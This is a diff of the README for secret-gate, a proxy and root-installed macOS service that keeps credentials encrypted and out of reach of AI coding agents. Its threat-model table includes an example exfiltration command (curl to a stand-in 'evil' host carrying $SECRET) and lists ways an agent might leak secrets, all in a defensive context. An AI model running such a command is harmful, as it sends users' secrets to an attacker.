@@ -21,13 +21,13 @@ model ──(request containing enc:v1 tokens)──▶ gate proxy :8080 ──(
 | Model runs `curl evil?p=$SECRET` | `secret_exec` only runs whitelisted templates with validated args |
 | Site echoes the value back | Proxy / ops redact every resolved value in responses and command output |
 | Token pasted into a tool that bypasses the gate | Site receives the literal ciphertext: login fails, nothing leaks |
-| Private key leaks | Keep `~/.secret-gate/` deny-listed for agents; better, run the gate as a separate OS user |
+| Private key leaks | Install the gate service (`secret-gate system install`, below): keys belong to the role account `_agentswitchgate`, unreadable for the login user; without it, keep `~/.secret-gate/` deny-listed for agents |
 
 ## Install
 
 ```bash
 cd secret-gate && python3.12 -m venv .venv && .venv/bin/pip install -e '.[dev]'
-.venv/bin/pytest                       # 450+ tests, ≥80% coverage enforced
+.venv/bin/pytest                       # 560+ tests, ≥80% coverage enforced
 ln -s "$PWD/.venv/bin/secret-gate" ~/.local/bin/secret-gate
 ```
 
@@ -73,8 +73,81 @@ the `upstream-insecure.txt` exceptions are gone). `secret-gate bootstrap <harnes
 listener really is the gate.
 
 The service runs as your user: it keeps the gate up and on loopback, but a harness running as the same
-user can still read `~/.secret-gate`. Running the gate under a separate macOS user is the stronger
-isolation and is still a manual setup.
+user can still read `~/.secret-gate`. The gate service below runs it under a separate account.
+
+## Gate service (`secret-gate system`, docs/gate-service-v0.md)
+
+The isolated setup the Mac app installs: the proxy and a local rpc server run as the macOS role account
+`_agentswitchgate` (no password, no login, UID/GID in 450–499) from LaunchDaemons, and everything secret is
+theirs. The login user's processes (daemon, executors, their shells, the browser component) cannot read it.
+
+```
+/Library/Application Support/AgentSwitch/          root:wheel 0755
+  gate/            _agentswitchgate 0700   SECRET_GATE_HOME and HOME of both services: keys/ (keys/legacy/),
+                                           current, refs.sqlite3, logs/{proxy,rpc}.log, logs/rpc-audit.jsonl,
+                                           mitmproxy/ (CA + key), exec_templates.json, upstream-insecure.txt,
+                                           screenshot-mask.json; dirs 0700, files 0600
+  gate-public/     _agentswitchgate 0755   keys.json (0644), ca.pem (0644), gate.sock (0666, peer-uid checked)
+  runtime/         root:wheel               python/ + secret-gate/ copied from the App bundle, VERSIONS,
+                                           bin/secret-gate (wrapper → python/bin/secret-gate)
+  gate-service.json root:wheel 0644         {"ownerUid", "proxyPort", "runtimeVersion", "installedAt"}
+/Library/LaunchDaemons/com.agentswitch.gate.{rpc,proxy}.plist   root:wheel 0644
+```
+
+The services run `runtime/bin/secret-gate rpc` and `runtime/bin/secret-gate proxy --port N --confdir
+<root>/gate/mitmproxy`, never the App bundle's copy (the bundle is writable by the login user). Environment:
+`SECRET_GATE_HOME=HOME=<root>/gate`, `SECRET_GATE_PUBLIC=<root>/gate-public`, a PATH of root-owned
+directories; `Umask 077`, `RunAtLoad`, `KeepAlive`; output to `gate/logs/{proxy,rpc}.log`.
+
+```bash
+# root (the Mac app asks for an administrator once)
+secret-gate system install --owner-uid $(id -u) --port 8080 \
+    --runtime /path/AgentSwitch.app/Contents/Resources/runtime --migrate-from ~/.secret-gate [--dry-run]
+secret-gate system update --runtime …/runtime [--port N] [--dry-run]    # swap runtime/, restart; data stays
+secret-gate system uninstall [--delete-keys] [--dry-run]                # keys and the account stay by default
+# anyone
+secret-gate system status [--json]
+```
+
+`install` creates the account (`dseditgroup`, `sysadminctl -addUser _agentswitchgate … -roleAccount`),
+the directories, the runtime copy and gate-service.json; migrates the old home: every keypair becomes a
+**legacy** keypair (decrypt only, never current again; `keys retire <name>` deletes one), a new keypair `main`
+becomes current, `refs.sqlite3`, the three trusted config files and old logs move in; generates a new
+mitmproxy CA in `gate/mitmproxy/` and publishes `ca.pem`; writes and bootstraps both LaunchDaemons and
+waits until `status` reports the proxy running and the migrated keys. Only then are the originals deleted
+(each only where an identical copy is in the service), the old CA private key in `~/.mitmproxy` removed and
+`~/.secret-gate/MOVED.txt` written. Any failing step stops the run and lists what was done and what was not;
+nothing is rolled back. Root touches the login user's directories only through `O_NOFOLLOW` directory
+descriptors. Stop a gate the Mac app started itself before installing: the service's proxy needs the port.
+`--root <prefix>` moves every system path under a prefix and only lists the privileged commands (tests).
+
+`status --json` → `{"installed", "running", "rpcRunning", "proxyRunning", "proxyPort", "runtimeVersion",
+"ownerUid", "publicDir", "bundledRuntimeVersion", "updateAvailable", "error"}` (always exit 0; `running` means
+rpc answered and the proxy is up; `updateAvailable` compares with the runtime this CLI belongs to, or
+`--runtime`). `runtimeVersion` is `<secret-gate version>+<built>` from the runtime's `VERSIONS`.
+
+**`gate.sock`** (`secret-gate rpc`): one JSON object per line, `{"id", "method", "params"}` →
+`{"id", "ok": true, "result"}` or `{"id", "ok": false, "error"}`, requests ≤ 1 MiB, one thread per
+connection. Only root and `ownerUid` are let in (the kernel's peer uid). Methods: `status`, `keys.list`,
+`keys.new {name, use?}`, `keys.use {name}`, `keys.retire {name}`, `refs.register {scope, tokens}`,
+`refs.release {scope}`, `credential.info {token}`, `credential.reissue {token, host, purpose}`,
+`mcp.describe|otp {scope?, token}`, `mcp.http {scope?, method, url, headers?, body?}`,
+`mcp.exec {scope?, template, token, args?}`, `mcp.repair {scope?, token, host, purpose?, repairUrl?, repairKey?}`,
+`browser.resolve {scope?, token, host}` (use `fill` only, `host` = the page's `host:port`),
+`browser.register {scope, token}`, `browser.config`, `logs.tail {name: proxy|rpc, lines ≤ 500}`. Every call
+is audited in `gate/logs/rpc-audit.jsonl` (no values). After a key change the service rewrites `keys.json`
+and sends SIGHUP to the proxy (pid from `gate/proxy.pid`), which reloads every key.
+
+**Service mode of the CLI.** When `$SECRET_GATE_PUBLIC/gate.sock` (default `<root>/gate-public/gate.sock`)
+exists and belongs to another user, the CLI is the service's client, with unchanged output: `keys [--json]`,
+`pubkey` and `enc` read `keys.json`; `keys new|use|retire`, `refs register|release`, `credential-info|reissue`
+go over the socket; `mcp` forwards every tool call to `mcp.*` with this process's `SECRET_GATE_SCOPE` and
+repair bridge; `browser` still runs Playwright as you but types values from `browser.resolve`, registers
+sealed page data with `browser.register`, takes the mask config from `browser.config` and keeps the
+downstream's output in a temporary directory of yours; `bootstrap` checks `keys.json` and the published
+`ca.pem`. `keygen`, `check`, `proxy`, `service`, `install-ca` and `rpc` are refused ("凭据网关由系统服务管理，
+请在 Mac 应用里操作。"). A service that does not answer is an error ("凭据网关服务无响应"), never a fallback
+to a local gate. Without `gate.sock` everything behaves as before.
 
 ### Check a harness and print its config
 
@@ -107,6 +180,10 @@ secret-gate keys use home                # switch: new tokens are minted for "ho
 Keypairs live in `<home>/keys/<name>/`; a legacy `<home>/key.priv` is listed as `default`.
 The proxy and MCP server decrypt with **every** keypair present, so switching never breaks
 tokens minted earlier. A native macOS front end for all of this is in `packages/secret-gate-ui`.
+
+Keypairs in `<home>/keys/legacy/<name>/` (what the gate service's install makes of an old home) only
+decrypt: `keys use` refuses them, `keys retire <name>` deletes one (its tokens stop working; the current
+keypair cannot be retired). `keys --json` rows are `{"name", "public", "current", "legacy"}`.
 
 ## Encrypt a secret
 
@@ -155,7 +232,7 @@ echo '{"scope":"<same>"}' | secret-gate refs release        # {"released": 1}
 
 | layer | command | hits a real model? |
 |---|---|---|
-| unit + scenarios (450+ tests, ≥80% coverage enforced) | `.venv/bin/pytest` | no |
+| unit + scenarios (560+ tests, ≥80% coverage enforced) | `.venv/bin/pytest` | no |
 | live proxy + curl smoke (tokens, and `enc:ref:` with scope over http and HTTPS CONNECT) | `.venv/bin/python scripts/smoke_e2e.py` | no |
 | **real headless Claude Code as the agent** | `.venv/bin/python scripts/claude_code_e2e.py` | yes (haiku, 4 short runs) |
 | **real headless OpenCode (DeepSeek) as the agent** | `.venv/bin/python scripts/opencode_e2e.py` | yes (deepseek-flash, 4 short runs) |
@@ -349,6 +426,9 @@ secret_gate/
   refs.py        refs_cli.py    credential_repair.py           audit.py
   browser_mcp.py browser_gate.py browser_policy.py browser_probe.py browser_mask.py
   pii.py         transfer.py
+  service_paths.py publish.py   proxy_pid.py   rpc_protocol.py rpc_server.py rpc_methods.py rpc_client.py
+  service_cli.py mcp_backend.py remote_resolver.py enc_cli.py
+  system_plan.py system_ops.py  system_exec.py system_cli.py migrate.py  user_dir.py   (gate service, docs/gate-service-v0.md)
 tests/           unit tests per module + test_scenarios.py (12 end-to-end cases)
 BOUNDARY.md      entry-point checklist (docs/gate-next-v0.md §4), checked by tests/test_boundary_checklist.py
 tests/fixtures/  fabricated credentials / PII used by the suite (nothing real)
@@ -369,7 +449,8 @@ starts mitmdump with `--set http2=false`. Header validation itself stays on.
 The proxy verifies upstream certificates like a browser would. A site with a self-signed
 certificate answers with `502 Bad Gateway: certificate verify failed: self-signed certificate in
 certificate chain`, and nothing the model does can fix that. List such hosts, one per line, in
-`~/.secret-gate/upstream-insecure.txt` (`host`, `host:port`, or `*.suffix`; `#` comments) and
+`~/.secret-gate/upstream-insecure.txt` (with the gate service: `<root>/gate/upstream-insecure.txt`, which
+needs an administrator; the Mac app does it) (`host`, `host:port`, or `*.suffix`; `#` comments) and
 reload the proxy (`secret-gate service reload`, see "Run as a service", or restart it): for those hosts alone the upstream certificate is accepted unverified (a warning
 is logged once per host); every other host stays strictly verified. Only do this for hosts you
 reach over a network you trust (LAN, Tailscale): an attacker on the path to an unverified host
